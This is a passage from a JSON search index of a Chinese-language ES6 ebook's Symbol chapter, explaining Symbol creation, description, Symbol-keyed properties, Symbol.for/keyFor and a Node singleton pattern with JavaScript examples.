s\n// \"symbol\"\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53d8\u91cf<code>s</code>\u5c31\u662f\u4e00\u4e2a\u72ec\u4e00\u65e0\u4e8c\u7684\u503c\u3002<code>typeof</code>\u8fd0\u7b97\u7b26\u7684\u7ed3\u679c\uff0c\u8868\u660e\u53d8\u91cf<code>s</code>\u662f Symbol \u6570\u636e\u7c7b\u578b\uff0c\u800c\u4e0d\u662f\u5b57\u7b26\u4e32\u4e4b\u7c7b\u7684\u5176\u4ed6\u7c7b\u578b\u3002</p> <p>\u6ce8\u610f\uff0c<code>Symbol</code>\u51fd\u6570\u524d\u4e0d\u80fd\u4f7f\u7528<code>new</code>\u547d\u4ee4\uff0c\u5426\u5219\u4f1a\u62a5\u9519\u3002\u8fd9\u662f\u56e0\u4e3a==\u751f\u6210\u7684 Symbol \u662f\u4e00\u4e2a\u539f\u59cb\u7c7b\u578b\u7684\u503c\uff0c\u4e0d\u662f\u5bf9\u8c61==\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u7531\u4e8e Symbol \u503c\u4e0d\u662f\u5bf9\u8c61\uff0c\u6240\u4ee5\u4e0d\u80fd\u6dfb\u52a0\u5c5e\u6027\u3002\u5b83\u662f\u4e00\u79cd==\u7c7b\u4f3c\u4e8e\u5b57\u7b26\u4e32\u7684\u6570\u636e\u7c7b\u578b==\u3002</p> <p><code>Symbol</code>\u51fd\u6570\u53ef\u4ee5\u63a5\u53d7\u4e00\u4e2a\u5b57\u7b26\u4e32\u4f5c\u4e3a\u53c2\u6570\uff0c\u8868\u793a\u5bf9 Symbol \u5b9e\u4f8b\u7684\u63cf\u8ff0\uff0c\u4e3b\u8981\u662f\u4e3a\u4e86\u5728\u63a7\u5236\u53f0\u663e\u793a\uff0c\u6216\u8005\u8f6c\u4e3a\u5b57\u7b26\u4e32\u65f6\uff0c\u6bd4\u8f83\u5bb9\u6613\u533a\u5206\u3002</p> <pre><code>let s1 = Symbol('foo');\nlet s2 = Symbol('bar');\n\ns1 // Symbol(foo)\ns2 // Symbol(bar)\n\ns1.toString() // \"Symbol(foo)\"\ns2.toString() // \"Symbol(bar)\"\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>s1</code>\u548c<code>s2</code>\u662f\u4e24\u4e2a Symbol \u503c\u3002\u5982\u679c\u4e0d\u52a0\u53c2\u6570\uff0c\u5b83\u4eec\u5728\u63a7\u5236\u53f0\u7684\u8f93\u51fa\u90fd\u662f<code>Symbol()</code>\uff0c\u4e0d\u5229\u4e8e\u533a\u5206\u3002\u6709\u4e86\u53c2\u6570\u4ee5\u540e\uff0c\u5c31\u7b49\u4e8e\u4e3a\u5b83\u4eec\u52a0\u4e0a\u4e86\u63cf\u8ff0\uff0c\u8f93\u51fa\u7684\u65f6\u5019\u5c31\u80fd\u591f\u5206\u6e05\uff0c\u5230\u5e95\u662f\u54ea\u4e00\u4e2a\u503c\u3002</p> <p>\u5982\u679c\u4f20\u5165\u7684\u53c2\u6570\u662f\u5bf9\u8c61\u6216\u8005\u65b9\u6cd5\uff0c\u9996\u5148\u5c06\u5bf9\u8c61toString\u4e4b\u540e\u521b\u5efaSymbol\u3002</p> <p>\u6ce8\u610f\uff0c<code>Symbol</code>\u51fd\u6570\u7684\u53c2\u6570\u53ea\u662f\u8868\u793a\u5bf9\u5f53\u524d Symbol \u503c\u7684\u63cf\u8ff0\uff0c\u56e0\u6b64==\u76f8\u540c\u53c2\u6570\u7684<code>Symbol</code>\u51fd\u6570\u7684\u8fd4\u56de\u503c\u662f\u4e0d\u76f8\u7b49\u7684==\u3002</p> <pre><code>// \u6ca1\u6709\u53c2\u6570\u7684\u60c5\u51b5\nlet s1 = Symbol();\nlet s2 = Symbol();\ns1 === s2 // false\n\n// \u6709\u53c2\u6570\u7684\u60c5\u51b5\nlet s1 = Symbol('foo');\nlet s2 = Symbol('foo');\ns1 === s2 // false\nObject.is(s1, s2) === false\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>s1</code>\u548c<code>s2</code>\u90fd\u662f<code>Symbol</code>\u51fd\u6570\u7684\u8fd4\u56de\u503c\uff0c\u800c\u4e14\u53c2\u6570\u76f8\u540c\uff0c\u4f46\u662f\u5b83\u4eec\u662f\u4e0d\u76f8\u7b49\u7684\u3002</p> <p>Symbol \u503c\u4e0d\u80fd\u4e0e\u5176\u4ed6\u7c7b\u578b\u7684\u503c\u8fdb\u884c\u8fd0\u7b97\uff0c\u4f1a\u62a5\u9519\u3002</p> <pre><code>let sym = Symbol('My symbol');\n\n\"your symbol is \" + sym\n// TypeError: can't convert symbol to string\n`your symbol is ${sym}`\n// TypeError: can't convert symbol to string\n</code></pre> <p>\u4f46\u662f\uff0cSymbol \u503c\u53ef\u4ee5\u663e\u5f0f\u8f6c\u4e3a\u5b57\u7b26\u4e32\u6216\u8005\u5e03\u5c14\u503c\uff0c\u4f46\u662f\u4e0d\u80fd\u8f6c\u5316\u6210\u6570\u503c\u3002</p> <pre><code>let sym = Symbol('My symbol');\nString(sym) // 'Symbol(My symbol)'\nsym.toString() // 'Symbol(My symbol)'\n// \u8f6c\u5316\u540e\u5305\u62ec\u524d\u9762\u7684Symbol\uff0c\u8f6c\u5316\u540e\u662f\u5168\u7b49\u7684\u5b57\u7b26\u4e32\n\nlet sym = Symbol();\nBoolean(sym) // true\n!sym  // false\n\nNumber(sym) // TypeError\nsym + 2 // TypeError\n</code></pre>"},{"location":"ebook-JSES6-RYF/12-Symbol/#symbolprototypedescription","title":"Symbol.prototype.description","text":"<p>\u521b\u5efa Symbol \u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u6dfb\u52a0\u4e00\u4e2a\u63cf\u8ff0\u3002</p> <pre><code>const sym = Symbol('foo');\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>sym</code>\u7684\u63cf\u8ff0\u5c31\u662f\u5b57\u7b26\u4e32<code>foo</code>\u3002</p> <p>\u4f46\u662f\uff0c\u8bfb\u53d6\u8fd9\u4e2a\u63cf\u8ff0\u9700\u8981\u5c06 Symbol \u663e\u5f0f\u8f6c\u4e3a\u5b57\u7b26\u4e32\uff0c\u5373\u4e0b\u9762\u7684\u5199\u6cd5\u3002</p> <pre><code>const sym = Symbol('foo');\nString(sym) // \"Symbol(foo)\"\nsym.toString() // \"Symbol(foo)\"\n</code></pre> <p>\u4e0a\u9762\u7684\u7528\u6cd5\u4e0d\u662f\u5f88\u65b9\u4fbf\u3002ES2019 \u63d0\u4f9b\u4e86\u4e00\u4e2a\u5b9e\u4f8b\u5c5e\u6027<code>description</code>\uff0c\u76f4\u63a5\u8fd4\u56de Symbol \u7684\u63cf\u8ff0\u3002</p> <pre><code>const sym = Symbol('foo');\nsym.description // \"foo\"\n</code></pre>"},{"location":"ebook-JSES6-RYF/12-Symbol/#symbol_1","title":"Symbol: \u5c5e\u6027\u540d","text":"<p>\u7531\u4e8e\u6bcf\u4e00\u4e2a Symbol \u503c\u90fd\u662f\u4e0d\u76f8\u7b49\u7684\uff0c\u8fd9\u610f\u5473\u7740 Symbol \u503c\u53ef\u4ee5\u4f5c\u4e3a\u6807\u8bc6\u7b26\uff0c\u7528\u4e8e\u5bf9\u8c61\u7684\u5c5e\u6027\u540d\uff0c\u5c31\u80fd\u4fdd\u8bc1\u4e0d\u4f1a\u51fa\u73b0\u540c\u540d\u7684\u5c5e\u6027\u3002\u8fd9\u5bf9\u4e8e==\u4e00\u4e2a\u5bf9\u8c61\u7531\u591a\u4e2a\u6a21\u5757\u6784\u6210==\u7684\u60c5\u51b5\u975e\u5e38\u6709\u7528\uff0c\u80fd\u9632\u6b62\u67d0\u4e00\u4e2a\u952e\u88ab\u4e0d\u5c0f\u5fc3\u6539\u5199\u6216\u8986\u76d6\u3002</p> <pre><code>let mySymbol = Symbol();\n\n// \u7b2c\u4e00\u79cd\u5199\u6cd5\nlet a = {};\na[mySymbol] = 'Hello!';\n\n// \u7b2c\u4e8c\u79cd\u5199\u6cd5\nlet a = {[mySymbol]: 'Hello!'};\n\n// \u7b2c\u4e09\u79cd\u5199\u6cd5\nlet a = {};\nObject.defineProperty(a, mySymbol, { value: 'Hello!' });\n\n// \u4ee5\u4e0a\u5199\u6cd5\u90fd\u5f97\u5230\u540c\u6837\u7ed3\u679c\na[mySymbol] // \"Hello!\"\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u901a\u8fc7\u65b9\u62ec\u53f7\u7ed3\u6784\u548c<code>Object.defineProperty</code>\uff0c\u5c06\u5bf9\u8c61\u7684\u5c5e\u6027\u540d\u6307\u5b9a\u4e3a\u4e00\u4e2a Symbol \u503c\u3002</p> <p>\u6ce8\u610f\uff0cSymbol \u503c\u4f5c\u4e3a\u5bf9\u8c61\u5c5e\u6027\u540d\u65f6\uff0c\u4e0d\u80fd\u7528\u70b9\u8fd0\u7b97\u7b26\u3002</p> <pre><code>const mySymbol = Symbol();\nconst a = {};\n\na.mySymbol = 'Hello!';\na[mySymbol] // undefined\na['mySymbol'] // \"Hello!\"\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u56e0\u4e3a\u70b9\u8fd0\u7b97\u7b26\u540e\u9762\u603b\u662f\u5b57\u7b26\u4e32\uff0c\u6240\u4ee5\u4e0d\u4f1a\u8bfb\u53d6<code>mySymbol</code>\u4f5c\u4e3a\u6807\u8bc6\u540d\u6240\u6307\u4ee3\u7684\u90a3\u4e2a\u503c\uff0c\u5bfc\u81f4<code>a</code>\u7684\u5c5e\u6027\u540d\u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u800c\u4e0d\u662f\u4e00\u4e2a Symbol \u503c\u3002</p> <p>\u540c\u7406\uff0c\u5728\u5bf9\u8c61\u7684\u5185\u90e8\uff0c\u4f7f\u7528 Symbol \u503c\u5b9a\u4e49\u5c5e\u6027\u65f6\uff0cSymbol \u503c\u5fc5\u987b\u653e\u5728\u65b9\u62ec\u53f7\u4e4b\u4e2d\u3002</p> <pre><code>let s = Symbol();\n\nlet obj = {\n  [s]: function (arg) { ... }\n};\n\nobj[s](123);\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5982\u679c<code>s</code>\u4e0d\u653e\u5728\u65b9\u62ec\u53f7\u4e2d\uff0c\u8be5\u5c5e\u6027\u7684\u952e\u540d\u5c31\u662f\u5b57\u7b26\u4e32<code>s</code>\uff0c\u800c\u4e0d\u662f<code>s</code>\u6240\u4ee3\u8868\u7684\u90a3\u4e2a Symbol \u503c\u3002</p> <p>\u91c7\u7528\u589e\u5f3a\u7684\u5bf9\u8c61\u5199\u6cd5\uff0c\u4e0a\u9762\u4ee3\u7801\u7684<code>obj</code>\u5bf9\u8c61\u53ef\u4ee5\u5199\u5f97\u66f4\u7b80\u6d01\u4e00\u4e9b\u3002</p> <pre><code>let obj = {\n  [s](arg) { ... }\n};\n</code></pre> <p>Symbol \u7c7b\u578b\u8fd8\u53ef\u4ee5\u7528\u4e8e\u5b9a\u4e49\u4e00\u7ec4\u5e38\u91cf\uff0c\u4fdd\u8bc1\u8fd9\u7ec4\u5e38\u91cf\u7684\u503c\u90fd\u662f\u4e0d\u76f8\u7b49\u7684\u3002</p> <pre><code>const log = {};\n\nlog.levels = {\n  DEBUG: Symbol('debug'),\n  INFO: Symbol('info'),\n  WARN: Symbol('warn')\n};\nconsole.log(log.levels.DEBUG, 'debug message');\nconsole.log(log.levels.INFO, 'info message');\n</code></pre> <p>\u4e0b\u9762\u662f\u53e6\u5916\u4e00\u4e2a\u4f8b\u5b50\u3002</p> <pre><code>const COLOR_RED    = Symbol();\nconst COLOR_GREEN  = Symbol();\n\nfunction getComplement(color) {\n  switch (color) {\n    case COLOR_RED:\n      return COLOR_GREEN;\n    case COLOR_GREEN:\n      return COLOR_RED;\n    default:\n      throw new Error('Undefined color');\n    }\n}\n</code></pre> <p>\u5e38\u91cf\u4f7f\u7528 Symbol \u503c\u6700\u5927\u7684\u597d\u5904\uff0c\u5c31\u662f\u5176\u4ed6\u4efb\u4f55\u503c\u90fd\u4e0d\u53ef\u80fd\u6709\u76f8\u540c\u7684\u503c\u4e86\uff0c\u56e0\u6b64\u53ef\u4ee5\u4fdd\u8bc1\u4e0a\u9762\u7684<code>switch</code>\u8bed\u53e5\u4f1a\u6309\u8bbe\u8ba1\u7684\u65b9\u5f0f\u5de5\u4f5c\u3002</p> <p>\u8fd8\u6709\u4e00\u70b9\u9700\u8981\u6ce8\u610f\uff0cSymbol \u503c\u4f5c\u4e3a\u5c5e\u6027\u540d\u65f6\uff0c\u8be5\u5c5e\u6027\u8fd8\u662f\u516c\u5f00\u5c5e\u6027\uff0c\u4e0d\u662f\u79c1\u6709\u5c5e\u6027\u3002</p>"},{"location":"ebook-JSES6-RYF/12-Symbol/#_2","title":"\u5b9e\u4f8b\uff1a\u6d88\u9664\u9b54\u672f\u5b57\u7b26\u4e32","text":"<p>\u9b54\u672f\u5b57\u7b26\u4e32\u6307\u7684\u662f\uff0c\u5728\u4ee3\u7801\u4e4b\u4e2d\u591a\u6b21\u51fa\u73b0\u3001\u4e0e\u4ee3\u7801\u5f62\u6210\u5f3a\u8026\u5408\u7684\u67d0\u4e00\u4e2a\u5177\u4f53\u7684\u5b57\u7b26\u4e32\u6216\u8005\u6570\u503c\u3002\u98ce\u683c\u826f\u597d\u7684\u4ee3\u7801\uff0c\u5e94\u8be5\u5c3d\u91cf\u6d88\u9664\u9b54\u672f\u5b57\u7b26\u4e32\uff0c\u6539\u7531\u542b\u4e49\u6e05\u6670\u7684\u53d8\u91cf\u4ee3\u66ff\u3002</p> <pre><code>function getArea(shape, options) {\n  let area = 0;\n\n  switch (shape) {\n    case 'Triangle': // \u9b54\u672f\u5b57\u7b26\u4e32\n      area = .5 * options.width * options.height;\n      break;\n    /* ... more code ... */\n  }\n\n  return area;\n}\n\ngetArea('Triangle', { width: 100, height: 100 }); // \u9b54\u672f\u5b57\u7b26\u4e32\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b57\u7b26\u4e32<code>Triangle</code>\u5c31\u662f\u4e00\u4e2a\u9b54\u672f\u5b57\u7b26\u4e32\u3002\u5b83\u591a\u6b21\u51fa\u73b0\uff0c\u4e0e\u4ee3\u7801\u5f62\u6210\u201c\u5f3a\u8026\u5408\u201d\uff0c\u4e0d\u5229\u4e8e\u5c06\u6765\u7684\u4fee\u6539\u548c\u7ef4\u62a4\u3002</p> <p>\u5e38\u7528\u7684==\u6d88\u9664\u9b54\u672f\u5b57\u7b26\u4e32\u7684\u65b9\u6cd5\uff0c\u5c31\u662f\u628a\u5b83\u5199\u6210\u4e00\u4e2a\u53d8\u91cf==\u3002</p> <pre><code>const shapeType = { triangle: 'Triangle' };\n\nfunction getArea(shape, options) {\n  let area = 0;\n  switch (shape) {\n    case shapeType.triangle:\n      area = .5 * options.width * options.height;\n      break;\n  }\n  return area;\n}\n\ngetArea(shapeType.triangle, { width: 100, height: 100 });\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6211\u4eec\u628a<code>Triangle</code>\u5199\u6210<code>shapeType</code>\u5bf9\u8c61\u7684<code>triangle</code>\u5c5e\u6027\uff0c\u8fd9\u6837\u5c31\u6d88\u9664\u4e86\u5f3a\u8026\u5408\u3002</p> <p>\u5982\u679c\u4ed4\u7ec6\u5206\u6790\uff0c\u53ef\u4ee5\u53d1\u73b0<code>shapeType.triangle</code>\u7b49\u4e8e\u54ea\u4e2a\u503c\u5e76\u4e0d\u91cd\u8981\uff0c\u53ea\u8981\u786e\u4fdd\u4e0d\u4f1a\u8ddf\u5176\u4ed6<code>shapeType</code>\u5c5e\u6027\u7684\u503c\u51b2\u7a81\u5373\u53ef\u3002\u56e0\u6b64\uff0c\u8fd9\u91cc\u5c31\u5f88\u9002\u5408\u6539\u7528 Symbol \u503c\u3002</p> <pre><code>const shapeType = {\n  triangle: Symbol()\n};\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u9664\u4e86\u5c06<code>shapeType.triangle</code>\u7684\u503c\u8bbe\u4e3a\u4e00\u4e2a Symbol\uff0c\u5176\u4ed6\u5730\u65b9\u90fd\u4e0d\u7528\u4fee\u6539\u3002</p>"},{"location":"ebook-JSES6-RYF/12-Symbol/#_3","title":"\u904d\u5386\u5c5e\u6027\u540d","text":"<p>Symbol \u4f5c\u4e3a\u5c5e\u6027\u540d\uff0c\u666e\u901a\u7684\u904d\u5386\u65b9\u6cd5\u65e0\u6cd5\u83b7\u53d6\u8fd9\u4e2a\u5c5e\u6027\uff08\u5982\u679c\u76f4\u63a5\u904d\u5386\u5bf9\u8c61\u7684\u5c5e\u6027\u5c31\u4f1a\u9057\u6f0f\u8fd9\u90e8\u5206\u5185\u5bb9\uff09\uff0c\u8be5\u5c5e\u6027\u4e0d\u4f1a\u51fa\u73b0\u5728<code>for...in</code>\u3001 <code>for...of</code>\u5faa\u73af\u4e2d\uff0c\u4e5f\u4e0d\u4f1a\u88ab<code>Object.keys()</code>\u3001 <code>Object.getOwnPropertyNames()</code>\u3001 <code>JSON.stringify()</code>\u8fd4\u56de\u3002\u4f46\u662f\uff0c\u5b83\u4e5f\u4e0d\u662f\u79c1\u6709\u5c5e\u6027\uff0c\u6709\u4e00\u4e2a<code>Object.getOwnPropertySymbols</code>\u65b9\u6cd5\uff0c\u53ef\u4ee5==\u83b7\u53d6\u6307\u5b9a\u5bf9\u8c61\u7684\u6240\u6709 Symbol \u5c5e\u6027\u540d==\u3002</p> <p><code>Object.getOwnPropertySymbols</code>\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\uff0c\u6210\u5458\u662f\u5f53\u524d\u5bf9\u8c61\u7684\u6240\u6709\u7528\u4f5c\u5c5e\u6027\u540d\u7684 Symbol \u503c\u3002</p> <pre><code>const obj = {};\nlet a = Symbol('a');\nlet b = Symbol('b');\n\nobj[a] = 'Hello';\nobj[b] = 'World';\n\nconst objectSymbols = Object.getOwnPropertySymbols(obj);\n// [Symbol(a), Symbol(b)]\n</code></pre> <p>\u4e0b\u9762\u662f\u53e6\u4e00\u4e2a\u4f8b\u5b50\uff0c<code>Object.getOwnPropertySymbols</code>\u65b9\u6cd5\u4e0e<code>for...in</code>\u5faa\u73af\u3001<code>Object.getOwnPropertyNames</code>\u65b9\u6cd5\u8fdb\u884c\u5bf9\u6bd4\u7684\u4f8b\u5b50\u3002</p> <pre><code>const obj = {};\nObject.defineProperty(obj, Symbol(\"foo\"), { value: \"foobar\" });\n\n// \u666e\u901a\u904d\u5386\u4e0d\u4f1a\u904d\u5386symbol\u5c5e\u6027\nfor (let i in obj) {\n  console.log(i); // \u65e0\u8f93\u51fa\n}\nObject.getOwnPropertyNames(obj)\n// []\n\nObject.getOwnPropertySymbols(obj)\n// [Symbol(foo)]\n</code></pre> <p>\u53e6\u4e00\u4e2a\u65b0\u7684 API\uff0c<code>Reflect.ownKeys</code>\u65b9\u6cd5\u53ef\u4ee5\u8fd4\u56de\u6240\u6709\u7c7b\u578b\u7684\u952e\u540d\uff0c\u5305\u62ec\u5e38\u89c4\u952e\u540d\u548c Symbol \u952e\u540d\u3002</p> <pre><code>let obj = {\n  [Symbol('my_key')]: 1,\n  enum: 2,\n  nonEnum: 3\n};\n\nReflect.ownKeys(obj)\n//  [\"enum\", \"nonEnum\", Symbol(my_key)]\n</code></pre> <p>\u7531\u4e8e\u4ee5 Symbol \u503c\u4f5c\u4e3a\u540d\u79f0\u7684\u5c5e\u6027\uff0c\u4e0d\u4f1a\u88ab\u5e38\u89c4\u65b9\u6cd5\u904d\u5386\u5f97\u5230\u3002\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u7279\u6027\uff0c\u4e3a\u5bf9\u8c61\u5b9a\u4e49\u4e00\u4e9b\u975e\u79c1\u6709\u7684\u3001\u4f46\u53c8\u5e0c\u671b\u53ea\u7528\u4e8e\u5185\u90e8\u7684\u65b9\u6cd5\u3002</p> <pre><code>let size = Symbol('size');\n\nclass Collection {\n  constructor() {\n    this[size] = 0;\n  }\n\n  add(item) {\n    this[this[size]] = item;\n    this[size]++;\n  }\n\n  static sizeOf(instance) {\n    return instance[size];\n  }\n}\n\nlet x = new Collection();\nCollection.sizeOf(x) // 0\n\nx.add('foo');\nCollection.sizeOf(x) // 1\n\nObject.keys(x) // ['0']\nObject.getOwnPropertyNames(x) // ['0']\nObject.getOwnPropertySymbols(x) // [Symbol(size)]\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5bf9\u8c61<code>x</code>\u7684<code>size</code>\u5c5e\u6027\u662f\u4e00\u4e2a Symbol \u503c\uff0c\u6240\u4ee5<code>Object.keys(x)</code>\u3001<code>Object.getOwnPropertyNames(x)</code>\u90fd\u65e0\u6cd5\u83b7\u53d6\u5b83\u3002\u8fd9\u5c31\u9020\u6210\u4e86\u4e00\u79cd\u975e\u79c1\u6709\u7684\u5185\u90e8\u65b9\u6cd5\u7684\u6548\u679c\u3002</p>"},{"location":"ebook-JSES6-RYF/12-Symbol/#symbolforsymbolkeyfor","title":"Symbol.for()\uff0cSymbol.keyFor()","text":"<p>\u6709\u65f6\uff0c\u6211\u4eec\u5e0c\u671b==\u91cd\u65b0\u4f7f\u7528\u540c\u4e00\u4e2a Symbol \u503c==\uff0c<code>Symbol.for</code>\u65b9\u6cd5\u53ef\u4ee5\u505a\u5230\u8fd9\u4e00\u70b9\u3002\u5b83\u63a5\u53d7\u4e00\u4e2a\u5b57\u7b26\u4e32\u4f5c\u4e3a\u53c2\u6570\uff0c\u7136\u540e\u641c\u7d22\u6709\u6ca1\u6709\u4ee5\u8be5\u53c2\u6570\u4f5c\u4e3a\u540d\u79f0\u7684 Symbol \u503c\u3002\u5982\u679c\u6709\uff0c\u5c31\u8fd4\u56de\u8fd9\u4e2a Symbol \u503c\uff0c\u5426\u5219\u5c31\u65b0\u5efa\u5e76\u8fd4\u56de\u4e00\u4e2a\u4ee5\u8be5\u5b57\u7b26\u4e32\u4e3a\u540d\u79f0\u7684 Symbol \u503c\u3002</p> <pre><code>let s1 = Symbol.for('foo');\nlet s2 = Symbol.for('foo');\n\ns1 === s2 // true\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>s1</code>\u548c<code>s2</code>\u90fd\u662f Symbol \u503c\uff0c\u4f46\u662f\u5b83\u4eec\u90fd\u662f\u540c\u6837\u53c2\u6570\u7684<code>Symbol.for</code>\u65b9\u6cd5\u751f\u6210\u7684\uff0c\u6240\u4ee5\u5b9e\u9645\u4e0a\u662f\u540c\u4e00\u4e2a\u503c\u3002</p> <p><code>Symbol.for()</code>\u4e0e<code>Symbol()</code>\u8fd9\u4e24\u79cd\u5199\u6cd5\uff0c\u90fd\u4f1a\u751f\u6210\u65b0\u7684 Symbol\u3002\u5b83\u4eec\u7684\u533a\u522b\u662f\uff0c\u524d\u8005\u4f1a\u88ab\u767b\u8bb0\u5728\u5168\u5c40\u73af\u5883\u4e2d\u4f9b\u641c\u7d22\uff0c\u540e\u8005\u4e0d\u4f1a\u3002<code>Symbol.for()</code>\u4e0d\u4f1a\u6bcf\u6b21\u8c03\u7528\u5c31\u8fd4\u56de\u4e00\u4e2a\u65b0\u7684 Symbol \u7c7b\u578b\u7684\u503c\uff0c\u800c\u662f\u4f1a\u5148\u68c0\u67e5\u7ed9\u5b9a\u7684<code>key</code>\u662f\u5426\u5df2\u7ecf\u5b58\u5728\uff0c\u5982\u679c\u4e0d\u5b58\u5728\u624d\u4f1a\u65b0\u5efa\u4e00\u4e2a\u503c\u3002\u6bd4\u5982\uff0c\u5982\u679c\u4f60\u8c03\u7528<code>Symbol.for(\"cat\")</code>30 \u6b21\uff0c\u6bcf\u6b21\u90fd\u4f1a\u8fd4\u56de\u540c\u4e00\u4e2a Symbol \u503c\uff0c\u4f46\u662f\u8c03\u7528<code>Symbol(\"cat\")</code>30 \u6b21\uff0c\u4f1a\u8fd4\u56de 30 \u4e2a\u4e0d\u540c\u7684 Symbol \u503c\u3002</p> <pre><code>Symbol.for(\"bar\") === Symbol.for(\"bar\")// true\n\nSymbol(\"bar\") === Symbol(\"bar\")// false\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7531\u4e8e<code>Symbol()</code>\u5199\u6cd5\u6ca1\u6709\u767b\u8bb0\u673a\u5236\uff0c\u6240\u4ee5\u6bcf\u6b21\u8c03\u7528\u90fd\u4f1a\u8fd4\u56de\u4e00\u4e2a\u4e0d\u540c\u7684\u503c\u3002</p> <p><code>Symbol.keyFor</code>\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5df2\u767b\u8bb0\u7684 Symbol \u7c7b\u578b\u503c\u7684<code>key</code>\u3002</p> <pre><code>let s1 = Symbol.for(\"foo\");\nSymbol.keyFor(s1) // \"foo\"\n\nlet s2 = Symbol(\"foo\");\nSymbol.keyFor(s2) // undefined\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53d8\u91cf<code>s2</code>\u5c5e\u4e8e\u672a\u767b\u8bb0\u7684 Symbol \u503c\uff0c\u6240\u4ee5\u8fd4\u56de<code>undefined</code>\u3002</p> <p>\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c<code>Symbol.for</code>\u4e3a Symbol \u503c\u767b\u8bb0\u7684\u540d\u5b57\uff0c\u662f\u5168\u5c40\u73af\u5883\u7684\uff0c\u53ef\u4ee5\u5728\u4e0d\u540c\u7684 iframe \u6216 service worker \u4e2d\u53d6\u5230\u540c\u4e00\u4e2a\u503c\u3002</p> <pre><code>iframe = document.createElement('iframe');\niframe.src = String(window.location);\ndocument.body.appendChild(iframe);\n\niframe.contentWindow.Symbol.for('foo') === Symbol.for('foo')\n// true\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0ciframe \u7a97\u53e3\u751f\u6210\u7684 Symbol \u503c\uff0c\u53ef\u4ee5\u5728\u4e3b\u9875\u9762\u5f97\u5230\u3002</p>"},{"location":"ebook-JSES6-RYF/12-Symbol/#singleton","title":"\u5b9e\u4f8b\uff1a\u6a21\u5757\u7684 Singleton \u6a21\u5f0f","text":"<p>Singleton \u6a21\u5f0f\u6307\u7684\u662f\u8c03\u7528\u4e00\u4e2a\u7c7b\uff0c\u4efb\u4f55\u65f6\u5019\u8fd4\u56de\u7684\u90fd\u662f\u540c\u4e00\u4e2a\u5b9e\u4f8b\u3002</p> <p>\u5bf9\u4e8e Node \u6765\u8bf4\uff0c\u6a21\u5757\u6587\u4ef6\u53ef\u4ee5\u770b\u6210\u662f\u4e00\u4e2a\u7c7b\u3002\u600e\u4e48\u4fdd\u8bc1\u6bcf\u6b21\u6267\u884c\u8fd9\u4e2a\u6a21\u5757\u6587\u4ef6\uff0c\u8fd4\u56de\u7684\u90fd\u662f\u540c\u4e00\u4e2a\u5b9e\u4f8b\u5462\uff1f</p> <p>\u5f88\u5bb9\u6613\u60f3\u5230\uff0c\u53ef\u4ee5\u628a\u5b9e\u4f8b\u653e\u5230\u9876\u5c42\u5bf9\u8c61<code>global</code>\u3002</p> <pre><code>// mod.js\nfunction A() {\n  this.foo = 'hello';\n}\n\nif (!global._foo) {\n  global._foo = new A();\n}\n\nmodule.exports = global._foo;\n</code></pre> <p>\u7136\u540e\uff0c\u52a0\u8f7d\u4e0a\u9762\u7684<code>mod.js</code>\u3002</p> <pre><code>const a = require('./mod.js');\nconsole.log(a.foo);\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53d8\u91cf<code>a</code>\u4efb\u4f55\u65f6\u5019\u52a0\u8f7d\u7684\u90fd\u662f<code>A</code>\u7684\u540c\u4e00\u4e2a\u5b9e\u4f8b\u3002</p> <p>\u4f46\u662f\uff0c\u8fd9\u91cc\u6709\u4e00\u4e2a\u95ee\u9898\uff0c\u5168\u5c40\u53d8\u91cf<code>global._foo</code>\u662f\u53ef\u5199\u7684\uff0c\u4efb\u4f55\u6587\u4ef6\u90fd\u53ef\u4ee5\u4fee\u6539\u3002</p> <pre><code>global._foo = { foo: 'world' };\n\nconst a = require('./mod.js');\nconsole.log(a.foo);\n</code></pre> <p>\u4e0a\u9762\u7684\u4ee3\u7801\uff0c\u4f1a\u4f7f\u5f97\u52a0\u8f7d<code>mod.js</code>\u7684\u811a\u672c\u90fd\u5931\u771f\u3002</p> <p>\u4e3a\u4e86\u9632\u6b62\u8fd9\u79cd\u60c5\u51b5\u51fa\u73b0\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u4f7f\u7528 Symbol\u3002</p> <pre><code>// mod.js\nconst FOO_KEY = Symbol.for('foo');\n\nfunction A() {\n  this.foo = 'hello';\n}\n\nif (!global[FOO_KEY]) {\n  global[FOO_KEY] = new A();\n}\n\nmodule.exports = global[FOO_KEY];\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53ef\u4ee5\u4fdd\u8bc1<code>global[FOO_KEY]</code>\u4e0d\u4f1a\u88ab\u65e0\u610f\u95f4\u8986\u76d6\uff0c\u4f46\u8fd8\u662f\u53ef\u4ee5\u88ab\u6539\u5199\u3002</p> <pre><code>global[Symbol.for('foo')] = { foo: 'world' };\n\nconst a = require('./mod.js');\n</code></pre> 